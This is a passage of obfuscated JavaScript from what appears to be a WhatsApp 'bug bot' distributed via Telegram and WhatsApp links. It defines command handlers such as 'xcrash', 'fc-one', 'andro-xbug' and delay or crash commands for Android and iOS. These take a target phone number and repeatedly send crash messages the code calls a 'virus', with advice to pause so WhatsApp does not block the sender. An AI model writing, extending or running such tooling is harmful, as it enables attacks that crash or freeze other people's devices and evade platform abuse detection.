          const すはき = えめうめく[すたきや[559] + すたきや[560]]();
          const しむちな = えめうめく[すたきや[561] + すたきや[562]]();
          const むもゆやし = すはき - しむちな;
          const もきしあよむ = やよほみよね(むもゆやし);
          const くけのくきよ = やよほみよね(すはき);
          let ちさつむつひ = はぬめけ();
          let ときのお = はぬめけ() - ちさつむつひ;
          const あぬゆささむ = うぬせ[すたきや[555] + すたきや[222]] || すたきや[556] + すたきや[44];
          const いおてねてい = "" + あぬゆささむ;
          let ねむほ = "\n> ┏━━〔 𝐁𝐎𝐓 𝐒𝐓𝐀𝐓𝐔𝐒 〕━━┓\n> ┃ ︻\n> ┃ ➥ ʙᴏᴛ ɴᴀᴍᴇ: *@MOTU_PATALU_HINDU_HAI*\n> ┃ ➥ ᴠᴇʀꜱɪᴏɴ: *6.0*\n> ┃ ➥ ᴅᴇᴠᴇʟᴏᴘᴇʀ: *@MOTU_PATALU_HINDU_HAI*\n> ┃ ➥ ᴘʀᴇꜰɪx: *[" + けしあ + ("]*\n> ┃ ➥ ᴛʏᴘᴇ: *x-ʙᴜɢ*\n> ┃ ︼\n> ┗━━━━━━━━━━━━━━━━━━━━┛\n\n> ┏━━〔 𝐁𝐔𝐆 𝐌𝐄𝐍𝐔 〕━━┓\n> ┃ ︻\n> ┃ ➥ *.ᴅᴇʟᴀʏ-ᴠɪs*\n> ┃ ➥ *.ᴅᴇʟᴀʏ-ɪɴᴠɪs*\n> ┃ ➥ *.ʙʟᴀɴᴋ-ᴄʟɪᴄᴋ*\n> ┃ ➥ *.ᴅᴇʟᴀʏ-ɪᴏs*\n> ┃ ➥ *.ᴛʀᴀsʜ-ɪᴏs*\n> ┃ ︼\n> ┗━━━━━━━━━━━━━━━━━━━━┛\n\n> ┏━━〔 𝐗𝐁𝐔𝐆 𝐌𝐄𝐍𝐔 〕━━┓\n> ┃ ︻\n> ┃ ➥ *.xᴄʀᴀsʜ*\n> ┃ ➥ *.xɢʀᴏᴜᴘ2*\n> ┃ ➥ *.xᴄʜᴀɴɴᴇʟ*\n> ┃ ︼\n> ┗━━━━━━━━━━━━━━━━━━━━┛" + すたきや[75]);
          せにににと(ねむほ);
        }
        break;
      case "xgroup2":
        {
          const すはき = えめうめく[すたきや[559] + すたきや[560]]();
          const しむちな = えめうめく[すたきや[561] + すたきや[562]]();
          const むもゆやし = すはき - しむちな;
          const もきしあよむ = やよほみよね(むもゆやし);
          const くけのくきよ = やよほみよね(すはき);
          let ちさつむつひ = はぬめけ();
          let ときのお = はぬめけ() - ちさつむつひ;
          const あぬゆささむ = うぬせ[すたきや[555] + すたきや[222]] || すたきや[556] + すたきや[44];
          const いおてねてい = "" + あぬゆささむ;
          let ねむほ = すたきや[563] + すたきや[564] + すたきや[565] + すたきや[566] + すたきや[567] + すたきや[568] + すたきや[569] + けしあ + "]*\n> ┃ ➥ ᴛʏᴘᴇ: *xɢʀᴏᴜᴘ*\n> ┃ ︼\n> ┗━━━━━━━━━━━━━━━━━━━━┛\n\n> ┏━━〔 𝐁𝐔𝐆 𝐆𝐑𝐎𝐔𝐏 〕━━┓\n> ┃ ︻\n> ┃ ➥ *.ғᴄ-ɢc [ɪɴ ɢᴄ]*\n> ┃ ➥ *.ᴄʀᴀᴄʜ-ɢc [ɪɴ ɢᴄ]*\n> ┃ ➥ *.ʙʟᴀɴᴋ-ɢc [ɪɴ ɢᴄ]*\n> ┃ ➥ *.ғʀᴇᴇᴢᴇ-ɢc [ɪɴ ɢᴄ]*\n> ┃ ︼\n> ┗━━━━━━━━━━━━━━━━━━━━┛\n";
          せにににと(ねむほ);
        }
        break;
      case "xchannel":
        {
          const すはき = えめうめく[すたきや[559] + すたきや[560]]();
          const しむちな = えめうめく[すたきや[561] + すたきや[562]]();
          const むもゆやし = すはき - しむちな;
          const もきしあよむ = やよほみよね(むもゆやし);
          const くけのくきよ = やよほみよね(すはき);
          let ちさつむつひ = はぬめけ();
          let ときのお = はぬめけ() - ちさつむつひ;
          const あぬゆささむ = うぬせ[すたきや[555] + すたきや[222]] || すたきや[556] + すたきや[44];
          const いおてねてい = "" + あぬゆささむ;
          let ねむほ = すたきや[563] + すたきや[564] + すたきや[565] + すたきや[566] + すたきや[567] + すたきや[568] + すたきや[569] + けしあ + "]*\n> ┃ ➥ ᴛʏᴘᴇ: *xᴄʜᴀɴɴᴇʟ*\n> ┃ ︼\n> ┗━━━━━━━━━━━━━━━━━━━━┛\n\n> ┏━━〔 𝐁𝐔𝐆 𝐂𝐇𝐀𝐍𝐍𝐄𝐋 〕━━┓\n> ┃ ︻\n> ┃ ➥ *.ғᴄ-ᴄʜ [ɪɴ ᴄʜ]*\n> ┃ ➥ *.ʙᴜɢ-ᴄʜ [ɪɴ ᴄʜ]*\n> ┃ ➥ *.ᴋɪʟʟ-ᴄʜ [ɪɴ ᴄʜ]*\n> ┃ ➥ *.ᴄʀᴀsʜ-ᴄʜ [ɪɴ ᴄʜ]*\n> ┃ ︼\n> ┗━━━━━━━━━━━━━━━━━━━━┛\n";
          せにににと(ねむほ);
        }
        break;
      case すたきや[570] + すたきや[503]:
        {
          const すはき = えめうめく[すたきや[559] + すたきや[560]]();
          const しむちな = えめうめく[すたきや[561] + すたきや[562]]();
          const むもゆやし = すはき - しむちな;
          const もきしあよむ = やよほみよね(むもゆやし);
          const くけのくきよ = やよほみよね(すはき);
          let ちさつむつひ = はぬめけ();
          let ときのお = はぬめけ() - ちさつむつひ;
          const あぬゆささむ = うぬせ[すたきや[555] + すたきや[222]] || すたきや[556] + すたきや[44];
          const いおてねてい = "" + あぬゆささむ;
          let ねむほ = すたきや[572] + すたきや[573] + すたきや[574] + すたきや[575] + すたきや[576] + けしあ + "]*\n> ┃ ➥ ᴛʏᴘᴇ: *ᴏᴛʜᴇʀ-ᴍᴇɴᴜ*\n> ┃ ︼\n> ┗━━━━━━━━━━━━━━━━━━━━┛\n\n> ┏━━〔 𝐎��𝐇𝐄𝐑 𝐌𝐄𝐍𝐔 〕━━┓\n> ┃ ︻\n> ┃ ➥ *.ᴀɪ*\n> ┃ ➥ *.ɪᴅᴄʜ*\n> ┃ ➥ *.ᴘɪɴɢ*\n> ┃ ➥ *.ɪɴғᴏᴡᴀ*\n> ┃ ➥ *.ᴀʙᴏᴜᴛ*\n> ┃ ➥ *.ʏᴛsᴇᴀʀᴄʜ*\n> ┃ ➥ *.ɪɴsᴛᴀɢʀᴀᴍ*\n> ┃ ➥ *.ᴛɪᴋᴛᴏᴋsʟɪᴅᴇ*\n> ┃ ➥ *.ᴛɪᴋᴛᴏᴋᴀᴜᴅɪᴏ*\n> ┃ ︼\n> ┗━━━━━━━━━━━━━━━━━━━━┛\n";
          せにににと(ねむほ);
        }
        break;
      case すたきや[571] + すたきや[503]:
        {
          const すはき = えめうめく[すたきや[559] + すたきや[560]]();
          const しむちな = えめうめく[すたきや[561] + すたきや[562]]();
          const むもゆやし = すはき - しむちな;
          const もきしあよむ = やよほみよね(むもゆやし);
          const くけのくきよ = やよほみよね(すはき);
          let ちさつむつひ = はぬめけ();
          let ときのお = はぬめけ() - ちさつむつひ;
          const あぬゆささむ = うぬせ[すたきや[555] + すたきや[222]] || すたきや[556] + すたきや[44];
          const いおてねてい = "" + あぬゆささむ;
          let ねむほ = すたきや[572] + すたきや[573] + すたきや[574] + すたきや[575] + すたきや[576] + けしあ + "]*\n> ┃ ➥ ᴛʏᴘᴇ: *ᴏᴡɴᴇʀ-ᴍᴇɴᴜ*\n> ┃ ︼\n> ┗━━━━━━━━━━━━━━━━━━━━┛\n\n> ┏━━〔 𝐎𝐖𝐍𝐄𝐑 𝐌𝐄𝐍𝐔 〕━━┓\n> ┃ ︻\n> ┃ ➥ *.ᴀᴅᴅᴏᴡɴᴇʀ*\n> ┃ ➥ *.ᴅᴇʟᴏᴡɴᴇʀ*\n> ┃ ➥ *.ᴘᴜʙʟɪᴄ*\n> ┃ ➥ *.sᴇʟғ*\n> ┃ ︼\n> ┗━━━━━━━━━━━━━━━━━━━━┛\n";
          せにににと(ねむほ);
        }
        break;
      case すたきや[577]:
        {
          const すはき = えめうめく[すたきや[559] + すたきや[560]]();
          const しむちな = えめうめく[すたきや[561] + すたきや[562]]();
          const むもゆやし = すはき - しむちな;
          const もきしあよむ = やよほみよね(むもゆやし);
          const くけのくきよ = やよほみよね(すはき);
          let ちさつむつひ = はぬめけ();
          let ときのお = はぬめけ() - ちさつむつひ;
          const あぬゆささむ = うぬせ[すたきや[555] + すたきや[222]] || すたきや[556] + すたきや[44];
          const いおてねてい = "" + あぬゆささむ;
          let ねむほ = "\n> ┏━━〔 𝐁𝐎𝐓 𝐒𝐓𝐀𝐓𝐔𝐒 〕━━┓\n> ┃ ︻\n> ┃ ➥ ʙᴏᴛ ɴᴀᴍᴇ: *ᴘʀɪᴍɪs ʙᴜɢ*\n> ┃ ➥ ᴠᴇʀꜱɪᴏɴ: *7.0*\n> ┃ ➥ ᴅᴇᴠᴇʟᴏᴘᴇʀ: *ᴅs ᴘʀɪᴍɪs*\n> ┃ ➥ ᴘʀᴇꜰɪx: *" + すたきや[578] + けしあ + ("]*\n> ┃ ➥ ᴛʏᴘᴇ: *ᴛǫᴛᴏ*\n> ┃ ︼\n> ┗━━━━━━━━━━━━━━━━━━━━┛\n\n> ┏━━〔 𝐓𝐐𝐓𝐎 〕━━┓\n> ┃ ︻\n> ┃ ➥ *@MOTU_PATALU_HINDU_HAI ‹ ᴏᴡɴᴇʀ ›*\n> ┃ ➥ *@Hx5x5x5x ‹ ᴄᴏʟʟᴀʙ ›*\n> ┃ ➥ *MOTU_PATALU_HINDU_HAI ‹ sᴘᴏɴsᴏʀ ›*\n> ┃ ➥ *MOTU_PATALU_HINDU_HAI ‹ ғʀɪᴇɴᴅ ›*\n> ┃ ➥ *MOTU_PATALU_HINDU_HAI ‹ ғʀɪᴇɴᴅ ›*\n> ┃ ➥ *MOTU_PATALU_HINDU_HAI ‹ ғʀɪᴇɴᴅ ›*\n> ┃ ➥ *MOTU_PATALU_HINDU_HAI ‹ ғʀɪᴇɴᴅ ›*\n> ┃ ➥ *MOTU_PATALU_HINDU_HAI ‹ ғʀɪᴇɴᴅ ›*\n> ┃ ➥ *MOTU_PATALU_HINDU_HAI ‹ ғʀɪᴇɴᴅ ›*\n> ┃ ➥ *http://t.me/MOTU_PATALU_HINDU_HAI ‹ ғʀɪᴇɴᴅ ›*\n> ┃ ︼\n> ┗━━━━━━━━━━━━━━━━━━━━┛\n\n> ┏━━〔 𝐓𝐄𝐀𝐌 〕━━┓\n> ┃ ︻\n> ┃ ➥ *MOTU_PATALU_HINDU_HAI ‹ ᴍʏᴛᴇᴀᴍ ›*\n> ┃ ➥ *MOTU_PATALU_HINDU_HAI ‹ ᴍʏᴛᴇᴀᴍ ›*\n> ┃ ➥ *MOTU_PATALU_HINDU_HAI ‹ ᴍʏᴛᴇᴀᴍ ›*\n> ┃ ➥ *MOTU_PATALU_HINDU_HAI ‹ ᴍʏᴛᴇᴀᴍ ›*\n> ┃ ︼\n> ┗━━━━━━━━━━━━━━━━━━━━┛" + すたきや[75]);
          せにににと(ねむほ);
        }
        break;
      case すたきや[579]:
        {
          const すはき = えめうめく[すたきや[559] + すたきや[560]]();
          const しむちな = えめうめく[すたきや[561] + すたきや[562]]();
          const むもゆやし = すはき - しむちな;
          const もきしあよむ = やよほみよね(むもゆやし);
          const くけのくきよ = やよほみよね(すはき);
          let ちさつむつひ = はぬめけ();
          let ときのお = はぬめけ() - ちさつむつひ;
          const あぬゆささむ = うぬせ[すたきや[555] + すたきや[222]] || すたきや[556] + すたきや[44];
          const いおてねてい = "" + あぬゆささむ;
          せにににと("\n> *🐉🐉🐉 ɴᴇᴇᴅ BUG BOT V6*\n> *ʏᴏᴜ ᴄᴀɴ ᴇᴀsɪʟʏ ғɪɴᴅ ɪᴛ ᴛʜʀᴏᴜɢʜ ᴏᴜʀ ᴏғғɪᴄɪᴀʟ ᴄʜᴀɴɴᴇʟs 🐉.*\n> *ᴇᴠᴇʀʏᴛʜɪɴɢ ɪs ᴡᴇʟʟ ᴏʀɢᴀɴɪᴢᴇᴅ sᴏ ʏᴏᴜ ᴄᴀɴ ᴀᴄᴄᴇss ᴛʜᴇ ғɪʟᴇ ǫᴜɪᴄᴋʟʏ,*\n> *ᴡɪᴛʜ ɴᴏ ғᴀᴋᴇ ᴏʀ ʙʀᴏᴋᴇɴ ʟɪɴᴋs 🐉.*\n\n> *📌 ʜᴇʀᴇ’s ᴡʜᴇʀᴇ ᴛᴏ ɢᴇᴛ ɪᴛ:*\n> *🔗 ᴡʜᴀᴛsᴀᴘᴘ ᴄʜᴀɴɴᴇʟ:*\n• https://chat.whatsapp.com/FeZsEEJw3h0DWXmcpb3IAS\n\n> *👥 ᴡʜᴀᴛsᴀᴘᴘ ɢʀᴏᴜᴘ:*\n• https://chat.whatsapp.com/FeZsEEJw3h0DWXmcpb3IAS\n\n> *📣 ᴛᴇʟᴇɢʀᴀᴍ ᴄʜᴀɴɴᴇʟ:*\n• https://t.me/+vSoZ3qJkxJdiYjE1\n\n> *💬 BUG BOT LINK 🔗:*\n• https://t.me/Xcandrobot?start=_tgr_mM34yjplNDk1\n\n> *ᴛʜᴀɴᴋs ғᴏʀ ʏᴏᴜʀ sᴜᴘᴘᴏʀᴛ 🐉*\n");
        }
        break;
      case すたきや[580] + すたきや[503]:
        {
          const すはき = えめうめく[すたきや[559] + すたきや[560]]();
          const しむちな = えめうめく[すたきや[561] + すたきや[562]]();
          const むもゆやし = すはき - しむちな;
          const もきしあよむ = やよほみよね(むもゆやし);
          const くけのくきよ = やよほみよね(すはき);
          let ちさつむつひ = はぬめけ();
          let ときのお = はぬめけ() - ちさつむつひ;
          const あぬゆささむ = うぬせ[すたきや[555] + すたきや[222]] || すたきや[556] + すたきや[44];
          const いおてねてい = "" + あぬゆささむ;
          let ねむほ = "\n> ┏━━〔 𝐁𝐎𝐓 𝐒𝐓𝐀𝐓𝐔𝐒 〕━━┓\n> ┃ ︻\n> ┃ ➥ ʙᴏᴛ ɴᴀᴍᴇ: *ᴘʀɪᴍɪs ʙᴜɢ*\n> ┃ ➥ ᴠᴇʀꜱɪᴏɴ: *7.0*\n> ┃ ➥ ᴅᴇᴠᴇʟᴏᴘᴇʀ: *ᴅs ᴘʀɪᴍɪs*\n> ┃ ➥ ᴘʀᴇꜰɪx: *[" + けしあ + "]*\n> ┃ ➥ ᴛʏᴘᴇ: *ᴏᴡɴᴇʀ-ᴍᴇɴᴜ*\n> ┃ ︼\n> ┗━━━━━━━━━━━━━━━━━━━━┛\n\n┏━━〔 𝐆𝐑𝐎𝐔𝐏 𝐌𝐄𝐍𝐔 〕━━┓\n> ┃ ︻\n> ┃ ➥ *.ᴀᴅᴅ*\n> ┃ ➥ *.ᴋɪᴄᴋ*\n> ┃ ➥ *.ᴋɪᴄᴋᴀʟʟ*\n> ┃ ➥ *.ᴛᴀɢᴀʟʟ*\n> ┃ ➥ *.ʜɪᴅᴇᴛᴀɢ*\n> ┃ ➥ *.ᴘʀᴏᴍᴏᴛᴇ*\n> ┃ ➥ *.ᴅᴇᴍᴏᴛᴇ*\n> ┃ ➥ *.sᴇᴛɴᴀᴍᴇ*\n> ┃ ➥ *.sᴇᴛᴅᴇsᴄ*\n> ┃ ➥ *.sᴇᴛᴘᴘɢᴄ*\n> ┃ ➥ *.ᴅᴇʟᴘᴘɢᴄ*\n> ┃ ➥ *.ᴏᴘᴇɴᴛɪᴍᴇ*\n> ┃ ➥ *.ᴄʟᴏsᴇᴛɪᴍᴇ*\n> ┃ ➥ *.ʟᴇᴀᴠᴇɢᴄ*\n> ┃ ︼\n> ┗━━━━━━━━━━━━━━━━━━━━┛\n";
          せにににと(ねむほ);
        }
        break;
      case "addown" + すたきや[590]:
        {
          if (!けもふめ) {
            return にひすもゆ(すなよ[すたきや[104] + すたきや[44]][すたきや[591]]);
          }
          if (!q) {
            return にひすもゆ(すたきや[584] + たちとた + (すたきや[585] + すたきや[592]));
          }
          let おちま = q[すたきや[475] + すたきや[44]](new RegExp(すたきや[581], すたきや[14]), "");
          if (おちま[すたきや[582] + すたきや[583]](すたきや[99])) {
            return にひすもゆ(すたきや[584] + たちとた + (すたきや[585] + すたきや[593]));
          }
          let はとまほい = おちま + (すたきや[80] + すたきや[81] + すたきや[82]);
          let のむよこむ = "You have now gained owner access to the bo" + すたきや[128];
          たねけちそい[すたきや[387]](おちま);
          ややめぬし[すたきや[596] + すたきや[597] + すたきや[598]](のちや[すたきや[474] + すたきや[44]](__dirname, すたきや[490] + すたきや[586] + すたきや[587] + すたきや[588] + すたきや[71]), JSON[すたきや[24] + すたきや[300]](たねけちそい), すたきや[589]);
          にひすもゆ(すたきや[599] + すたきや[600] + " added" + " to ow" + "ner li" + "st");
          await とふすせ(すたきや[177]);
          くめうめみか[すたきや[41] + すたきや[42]](はとまほい, {
            [すたきや[43]]: のむよこむ
          });
        }
        break;
      case "delown" + すたきや[590]:
        {
          if (!けもふめ) {
            return にひすもゆ(すなよ[すたきや[104] + すたきや[44]][すたきや[591]]);
          }
          if (!q) {
            return にひすもゆ(すたきや[584] + たちとた + (すたきや[585] + すたきや[592]));
          }
          let おちま = q[すたきや[475] + すたきや[44]](new RegExp(すたきや[581], すたきや[14]), "");
          if (おちま[すたきや[582] + すたきや[583]](すたきや[99])) {
            return にひすもゆ(すたきや[584] + たちとた + (すたきや[585] + すたきや[593]));
          }
          let にうはけ = たねけちそい["indexO" + すたきや[594]](おちま);
          if (にうはけ > -すたきや[1]) {
            たねけちそい[すたきや[595]](にうはけ, すたきや[1]);
            ややめぬし[すたきや[596] + すたきや[597] + すたきや[598]](のちや[すたきや[474] + すたきや[44]](__dirname, すたきや[490] + すたきや[586] + すたきや[587] + すたきや[588] + すたきや[71]), JSON[すたきや[24] + すたきや[300]](たねけちそい), すたきや[589]);
            にひすもゆ(すたきや[698] + すたきや[599] + すたきや[600] + " delet" + すたきや[802]);
          } else {
            にひすもゆ(すたきや[810] + " not f" + "ound i" + "n owne" + "r list");
          }
        }
        break;
      case "self":
        {
          if (!けもふめ) {
            return にひすもゆ(すなよ[すたきや[104] + すたきや[44]][すたきや[591]]);
          }
          くめうめみか[すたきや[601]] = すたきや[4];
          にひすもゆ("*Success Change Mode Public To Self" + すたきや[707]);
        }
        break;
      case すたきや[601]:
        {
          if (!けもふめ) {
            return にひすもゆ(すなよ[すたきや[104] + すたきや[44]][すたきや[591]]);
          }
          くめうめみか[すたきや[601]] = すたきや[4];
          にひすもゆ("*Success Change Mode Self To Public*");
        }
        break;
      case "xcrash":
        {
          if (!q) {
            return にひすもゆ(すなよ[すたきや[104] + すたきや[44]][すたきや[591]]);
          }
          if (!q) {
            return にひすもゆ(すたきや[602] + すたきや[603] + たちとた + (すたきや[585] + "x*"));
          }
          let むけえたく = きはゆ[すたきや[469]](すたきや[616])[すたきや[0]];
          let はちははも = q[すたきや[475] + すたきや[44]](new RegExp(すたきや[581], すたきや[14]), "");
          if (はちははも[すたきや[582] + すたきや[583]](すたきや[99])) {
            return にひすもゆ(すたきや[602] + すたきや[603] + たちとた + (すたきや[585] + "x* !!"));
          }
          if (むけえたく == すたきや[604] + すたきや[617]) {
            return にひすもゆ(すたきや[618] + すたきや[619] + すたきや[620] + すたきや[621]);
          }
          let めねち = "" + はちははも + (すたきや[80] + すたきや[81] + すたきや[82]);
          let ねむほ = "\n🩸⃟༑⌁⃰🩸⃟༑⌁⃰MOTU PATLUཀ͜͡🦠\n›› 𝐀𝐭𝐭𝐚𝐜𝐤𝐢𝐧𝐠 : " + はちははも + すたきや[75];
          const もひそくてひ = {
            [すたきや[442]]: {
              [すたきや[122]]: ふそなちよけ
            },
            [すたきや[70] + すたきや[71]]: ねむほ,
            [すたきや[110]]: "િ፷MOTU PATLUཀ͜͡፮▾ ༑̴⟆",
            [すたきや[113] + すたきや[365]]: すたきや[605],
            [すたきや[148] + すたきや[149]]: {
              [すたきや[233] + すたきや[234] + すたきや[235]]: すたきや[606],
              [すたきや[231] + すたきや[232]]: すたきや[4],
              [すたきや[233] + すたきや[443] + すたきや[444] + すたきや[445] + すたきや[239]]: {
                [すたきや[210] + すたきや[240] + すたきや[209]]: すたきや[607] + "teller",
                [すたきや[242] + すたきや[88] + すたきや[172]]: すたきや[37],
                [すたきや[210] + すたきや[241] + すたきや[222]]: すたきや[183]
              },
              [すたきや[130] + すたきや[179]]: ["1313555002@s.whatsapp.net"]
            },
            [すたきや[126] + すたきや[608]]: すたきや[4],
            [すたきや[78] + すたきや[77]]: []
          };
          const せしのねゆゆ = {
            [すたきや[78] + すたきや[294]]: "action",
            [すたきや[78] + すたきや[320]]: {
              [すたきや[363] + すたきや[321]]: "Option" + すたきや[77]
            },
            [すたきや[139]]: すたきや[9],
            [すたきや[89] + "FlowIn" + "fo"]: {
              [すたきや[90]]: すたきや[298] + すたきや[299] + すたきや[128],
              [すたきや[157] + すたきや[91]]: JSON[すたきや[24] + すたきや[300]]({
                [すたきや[98]]: すたきや[609],
                [すたきや[610] + すたきや[401]]: [{
                  [すたきや[98]]: "⌜ 𝐀𝐧𝐝𝐫𝐨𝐢𝐝 ��𝐞𝐧 𝐈𝐧 𝐂𝐲𝐛��𝐫𝐒𝐩𝐚𝐜𝐞♻️ ⌟",
                  [すたきや[611] + すたきや[612] + すたきや[613]]: "〽️",
                  [すたきや[614]]: [{
                    [すたきや[113]]: "",
                    [すたきや[98]]: "👉 𝐃͢𝐄͡𝐋͜𝐀͢��͡ ⍣᳟ 𝐀͜𝐍͢𝐃͡��͢𝐎🦠",
                    [すたきや[450] + すたきや[451]]: "› delay invis (type: no tag status)",
                    [すたきや[47]]: ".delay-andro" + すたきや[39] + めねち
                  }, {
                    [すたきや[113]]: "",
                    [すたきや[98]]: "👉 𝐅͢𝐂͡ ⍣᳟ 𝐈͜𝐍͢𝐕͡𝐈𝐒🦠",
                    [すたきや[450] + すたきや[451]]: "› fc no click (type: call crash)",
                    [すたきや[47]]: ".andro-xbug " + めねち
                  }, {
                    [すたきや[113]]: "",
                    [すたきや[98]]: "👉 𝐅͢𝐂͡ ⍣᳟ 𝐈͜𝐍͢𝐅͡𝐈𝐍��𝐓𝐘🦠",
                    [すたきや[450] + すたきや[451]]: "› fc no click (type: fc perma)",
                    [すたきや[47]]: ".fc-one " + めねち
                  }]
                }, {
                  [すたきや[98]]: "⌜ 𝐈𝐨𝐒 𝐌𝐞𝐧 𝐈𝐧 𝐂��𝐛𝐞𝐫��𝐩𝐚𝐜��♻️ ⌟",
                  [すたきや[611] + すたきや[612] + すたきや[613]]: "🍏",
                  [すたきや[614]]: [{
                    [すたきや[113]]: "",
                    [すたきや[98]]: "👉 𝐃͢𝐄͡𝐋͜𝐀͢𝐘͡ ⍣᳟ 𝐈͜𝐎͢𝐒🦠",
                    [すたきや[450] + すたきや[451]]: "› delay invis (type: no tag status)",
                    [すたきや[47]]: ".dly-ios " + めねち
                  }, {
                    [すたきや[113]]: "",
                    [すたきや[98]]: "👉 𝐂͢𝐑͡��͜𝐒͢𝐇 ⍣᳟ 𝐈͜𝐎͢𝐒��",
                    [すたきや[450] + すたきや[451]]: "› crash ios invisible (type: 26.1" + すたきや[615],
                    [すたきや[47]]: ".ios-xbug " + めねち
                  }]
                }]
              })
            }
          };
          もひそくてひ[すたきや[78] + すたきや[77]][すたきや[387]](せしのねゆゆ);
          return await くめうめみか[すたきや[41] + すたきや[42]](うぬせ[すたきや[446]], もひそくてひ, {
            [すたきや[184]]: へくしねぬた
          });
        }
        break;
      case "andro-xbug":
        {
          if (!q) {
            return にひすもゆ(すなよ[すたきや[104] + すたきや[44]][すたきや[591]]);
          }
          if (!q) {
            return にひすもゆ(すたきや[584] + たちとた + (すたきや[585] + すたきや[592]));
          }
          let むけえたく = きはゆ[すたきや[469]](すたきや[616])[すたきや[0]];
          let はちははも = q[すたきや[475] + すたきや[44]](new RegExp(すたきや[581], すたきや[14]), "");
          if (はちははも[すたきや[582] + すたきや[583]](すたきや[99])) {
            return にひすもゆ(すたきや[584] + たちとた + (すたきや[585] + すたきや[593]));
          }
          if (むけえたく == すたきや[604] + すたきや[617]) {
            return にひすもゆ(すたきや[618] + すたきや[619] + すたきや[620] + すたきや[621]);
          }
          let めねち = "" + はちははも + (すたきや[80] + すたきや[81] + すたきや[82]);
          let ひふのえは = すたきや[635] + すたきや[636] + すたきや[637] + すたきや[638] + すたきや[39] + めねち + ("\n𖥂 𝐕𝐈𝐑𝐔𝐒 : 𝗖𝗿𝗮𝘀𝗵𝗲𝗱\n\n_» After you send the virus, Please wait 5 minutes so that whatsapp is not blocked." + すたきや[622]);
          せにににと(ひふのえは);
          for (let まさし = すたきや[0]; まさし < すたきや[18]; まさし++) {
            await へきうしえ(めねち);
            console[すたきや[440]](そむひあはな[すたきや[623]](すたきや[624] + すたきや[625] + すたきや[626] + すたきや[627]));
          }
        }
        break;
      case "fc-one":
        {
          if (!q) {
            return にひすもゆ(すなよ[すたきや[104] + すたきや[44]][すたきや[591]]);
          }
          if (!q) {
            return にひすもゆ(すたきや[584] + たちとた + (すたきや[585] + すたきや[592]));
          }
          let むけえたく = きはゆ[すたきや[469]](すたきや[616])[すたきや[0]];
          let はちははも = q[すたきや[475] + すたきや[44]](new RegExp(すたきや[581], すたきや[14]), "");
          if (はちははも[すたきや[582] + すたきや[583]](すたきや[99])) {
            return にひすもゆ(すたきや[584] + たちとた + (すたきや[585] + すたきや[593]));
          }
          if (むけえたく == すたきや[604] + すたきや[617]) {
            return にひすもゆ(すたきや[665] + すたきや[666] + すたきや[667] + すたきや[628]);
          }
          let めねち = "91xxx" + はちははも + (すたきや[80] + すたきや[81] + すたきや[82]);
          let ひふのえは = すたきや[683] + すたきや[684] + すたきや[685] + すたきや[686] + すたきや[687] + すたきや[688] + すたきや[689] + すたきや[39] + めねち + ("\n𖥂 𝐕𝐈𝐑𝐔𝐒 : 𝗖𝗿𝗮𝘀𝗵𝗢𝗻𝗲𝗠𝘀𝗴\n\n_» After you send the virus, Please wait 5 minutes so that whatsapp is not blocked." + すたきや[622]);
          せにににと(ひふのえは);
          for (let まさし = すたきや[0]; まさし < すたきや[1]; まさし++) {
            await すとゆのし(めねち);
            await うけねか(めねち);
            console[すたきや[440]](そむひあはな[すたきや[623]](すたきや[624] + すたきや[625] + すたきや[626] + すたきや[627]));
          }
        }
        break;
      case すたきや[643] + "andro":
        {
          if (!けもふめ) {
            return にひすもゆ(すなよ[すたきや[104] + すたきや[44]][すたきや[591]]);
          }
          if (!q) {
            return にひすもゆ(すたきや[584] + たちとた + (すたきや[585] + すたきや[592]));
          }
          let むけえたく = きはゆ[すたきや[469]](すたきや[616])[すたきや[0]];
          let はちははも = q[すたきや[475] + すたきや[44]](new RegExp(すたきや[581], すたきや[14]), "");
          if (はちははも[すたきや[582] + すたきや[583]](すたきや[99])) {
            return にひすもゆ(すたきや[584] + たちとた + (すたきや[585] + すたきや[593]));
          }
          if (むけえたく == すたきや[604] + すたきや[617]) {
            return にひすもゆ(すたきや[630] + すたきや[631] + すたきや[632] + すたきや[633] + すたきや[634] + すたきや[628]);
          }
          let めねち = "" + はちははも + (すたきや[80] + すたきや[81] + すたきや[82]);
          let ひふのえは = すたきや[670] + すたきや[671] + すたきや[672] + すたきや[673] + すたきや[674] + すたきや[629] + めねち + "\n𖥂 𝐕𝐈𝐑𝐔𝐒 : 𝗗𝗲𝗹𝗮𝘆𝗔𝗻𝗱𝗿𝗼\n\n_» After you send the virus, Please wait 5 minutes so that whatsapp is not blocked._";
          せにににと(ひふのえは);
          for (let まさし = すたきや[0]; まさし < すたきや[17]; まさし++) {
            await ふさよへへ(めねち, ptcp = すたきや[4]);
            await もきこえいあ(めねち);
            await あとたや(めねち);
            console[すたきや[440]](そむひあはな[すたきや[623]](すたきや[657] + すたきや[658] + すたきや[659] + すたきや[660] + すたきや[661]));
          }
        }
        break;
      case "dly-io" + すたきや[77]:
        {
          if (!けもふめ) {
            return にひすもゆ(すなよ[すたきや[104] + すたきや[44]][すたきや[591]]);
          }
          if (!q) {
            return にひすもゆ(すたきや[584] + たちとた + (すたきや[585] + すたきや[592]));
          }
          let むけえたく = きはゆ[すたきや[469]](すたきや[616])[すたきや[0]];
          let はちははも = q[すたきや[475] + すたきや[44]](new RegExp(すたきや[581], すたきや[14]), "");
          if (はちははも[すたきや[582] + すたきや[583]](すたきや[99])) {
            return にひすもゆ(すたきや[584] + たちとた + (すたきや[585] + すたきや[593]));
          }
          if (むけえたく == すたきや[604] + すたきや[617]) {
            return にひすもゆ(すたきや[630] + すたきや[631] + すたきや[632] + すたきや[633] + すたきや[634] + すたきや[628]);
          }
          let めねち = "" + はちははも + (すたきや[80] + すたきや[81] + すたきや[82]);
          let ひふのえは = すたきや[635] + すたきや[636] + すたきや[637] + すたきや[638] + すたきや[39] + めねち + "\n𖥂 𝐕𝐈𝐑𝐔𝐒 : 𝗗𝗲𝗹𝗮𝘆𝗜𝗼𝘀\n\n_» After you send the virus, Please wait 5 minutes so that whatsapp is not blocked._";
          せにににと(ひふのえは);
          for (let まさし = すたきや[0]; まさし < すたきや[17]; まさし++) {
            await ふさよへへ(めねち, ptcp = すたきや[4]);
            console[すたきや[440]](そむひあはな[すたきや[623]](すたきや[639] + すたきや[640] + すたきや[641] + すたきや[642]));
          }
        }
        break;
      case すたきや[643] + "invis":
        {
          if (!けもふめ) {
            return にひすもゆ(すなよ[すたきや[104] + すたきや[44]][すたきや[591]]);
          }
          if (!q) {
            return にひすもゆ(すたきや[648] + すたきや[649] + すたきや[650] + たちとた + (すたきや[585] + すたきや[644]));
          }
          let むけえたく = きはゆ[すたきや[469]](すたきや[616])[すたきや[0]];
